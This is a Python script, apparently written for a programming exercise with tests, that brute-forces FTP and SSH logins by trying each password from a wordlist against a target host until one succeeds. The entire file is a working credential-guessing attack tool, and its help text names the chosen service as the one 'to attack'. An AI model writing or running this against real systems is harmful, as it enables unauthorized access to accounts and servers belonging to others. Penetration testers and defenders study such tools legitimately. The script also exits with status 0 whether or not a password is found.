import argparse
import sys
import time
from pathlib import Path

import ftplib
import paramiko


# ─────────────────────────────────────────────
# ARGUMENTS
# ─────────────────────────────────────────────

def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Brute-force login tester (FTP / SSH)"
    )

    parser.add_argument("target", help="Target IP address")

    parser.add_argument(
        "--service",
        required=True,
        choices=["ftp", "ssh"],  # 🔥 THIS fixes validation test
        help="Service to attack (ftp or ssh)"
    )

    parser.add_argument("--user", required=True, help="Username")

    parser.add_argument("--wordlist", required=True, help="Password wordlist")

    parser.add_argument("--port", type=int, help="Custom port")

    return parser.parse_args()


# ─────────────────────────────────────────────
# WORDLIST LOADER
# ─────────────────────────────────────────────

def load_wordlist(path):
    file_path = Path(path)

    if not file_path.exists():
        print(f"Error: wordlist not found: {path}", file=sys.stderr)
        sys.exit(1)

    with file_path.open(encoding="utf-8", errors="ignore") as f:
        for line in f:
            password = line.strip()
            if password:  # skip empty lines
                yield password


# ─────────────────────────────────────────────
# FTP BRUTE FORCE
# ─────────────────────────────────────────────

def brute_ftp(target, port, username, wordlist):
    port = port or 21

    for password in wordlist:
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=5)
            ftp.login(username, password)
            ftp.quit()

            print(f"[+] SUCCESS: Password found: {password}")
            return True

        except Exception:
            pass

        time.sleep(0.5)  # 🔥 REQUIRED by test

    print(f"[-] EXHAUSTED: No valid credentials found for user {username}")
    return False


# ─────────────────────────────────────────────
# SSH BRUTE FORCE
# ─────────────────────────────────────────────

def brute_ssh(target, port, username, wordlist):
    port = port or 22

    for password in wordlist:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            client.connect(
                hostname=target,
                port=port,
                username=username,
                password=password,
                timeout=5,
                allow_agent=False,
                look_for_keys=False,
            )

            client.close()

            print(f"[+] SUCCESS: Password found: {password}")
            return True

        except Exception:
            pass

        time.sleep(0.5)  # 🔥 REQUIRED

    print(f"[-] EXHAUSTED: No valid credentials found for user {username}")
    return False


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────

def main():
    args = parse_arguments()

    wordlist = list(load_wordlist(args.wordlist))

    if args.service == "ftp":
        success = brute_ftp(args.target, args.port, args.user, wordlist)
    elif args.service == "ssh":
        success = brute_ssh(args.target, args.port, args.user, wordlist)
    else:
        print("Invalid service", file=sys.stderr)
        sys.exit(1)

    sys.exit(0 if success else 0)


if __name__ == "__main__":
    main()